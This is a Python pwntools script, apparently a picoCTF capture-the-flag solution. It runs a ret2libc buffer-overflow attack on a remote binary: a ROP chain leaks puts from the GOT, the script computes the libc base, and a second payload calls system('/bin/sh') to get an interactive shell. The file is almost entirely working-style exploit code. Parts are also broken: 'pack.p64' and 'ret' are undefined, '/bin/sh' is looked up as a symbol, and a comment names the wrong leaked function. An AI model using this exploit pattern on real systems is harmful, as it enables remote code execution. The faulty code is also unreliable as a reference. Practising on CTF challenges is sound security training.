from pwn import *

context.arch = "amd64"

#_________ALL THE FILES WE NEED__________

elf = ELF("./vuln")
rop_elf = ROP(elf)

libc = ELF("libc.so.6")
rop_libc = ROP(libc)

#________________________________________





#________CONNECTION WITH SERVER___________

host, port = "mercury.picoctf.net" , 49464
p = remote(host, port)

#_________________________________________






#_______ADDRESSES NEED FOR FIRST PAYLOAD________________

padding = "A" * 136                                                     #padding found by overflowing the RIP return address
pop_rdi = rop_elf.find_gadget(["pop rdi", "ret"]).address               #ROP gadget for popping RDI
pop_rsi = rop_elf.find_gadget(["pop rsi", "pop r15", "ret"]).address    #ROP gadget for popping RSI

puts_got = elf.got["puts"]          #the address of the puts function in GOT table (in order to call it)
puts_plt = elf.plt["puts"]          #the address of the puts function in PLT table
main = elf.sym["main"]              #the address of the first instruction in main (to call it back again)
do_stuff = elf.sym["do_stuff"]      #the address of the main function(to call it back again to send the second payload)

#We can choose in the second payload to call back the do_stuff function instead of main function
#Because need only 2 payloads (else we would have called main because of the while(True)
#_______________________________________________________






#__________________SENDING PAYLOAD__________________________

# Craft the payload to leak address of setbuf in libc

print(p.recvline())         #recieves the line that asks for the input

payload = padding.encode()  #add the padding to overflow the buffer
payload += p64(pop_rdi)     #pop rdi
payload += p64(puts_got)    #address of puts in the GOT Table(it will be the first argument of put() function)
payload += p64(puts_plt)    #address of puts in the PLT table (in order to call it)
payload += p64(main)        #return to main  function to execute it again

p.sendline(payload)
print(p.recvline())

#___________________________________________________________










#______________ADDRESS NEEDED FOR THE SECOND PAYLOAD_______________

#leak = p.recvline().rstrip()                      #retrived the address of the puts leak
#puts_libc = u64(leak + (8-len(leak)) * "\x00")    #unpack the address in under a length of 8 bytes

leak = p.recv(6)+b'\x00\x00'                       #retrieve the address of the leaked buffer with a length of 8 bytes
leak = u64(leak)                                   # unpack the address

#leak = pack.u64(p.recvline().strip().ljust(8, b"\x00"))     #in order to leak the address of the puts() function
log.info(f" address of the leaked: " , hex(leak))

offset = libc.symbols["puts"]


libc_base = leak - offset
log.info("the base address of LIBC: ", libc_base)


#binsh= next(libc.search(b'/bin/sh\x00'))
system= libc.symbols['system']
libc_system = libc_base + system
log.info("the address of system in LIBC: ",libc_system)



binsh = libc.symbols["/bin/sh"]
libc_binsh = libc_base + binsh
log.info("the address of the /bin/sh in LIBC: ", libc_binsh)

#__________________________________________________________________










#___________________SENDING SECOND PAYLOAD________________________

#  Craft the payload to call system("/bin/sh")

payload = padding.encode()          # Pad the stack until the stored RIP
payload += pack.p64(pop_rdi)        # Set the address of the string /bin/sh as the first argument of system()
payload += pack.p64(libc_binsh)     # This will be the first argument of system()
payload += pack.p64(ret)            # Align the stack to 16 bytes otherwise system() will crash
payload += pack.p64(libc_system)    # Call system()


p.sendline(payload)
#_________________________________________________________________




p.interactive()
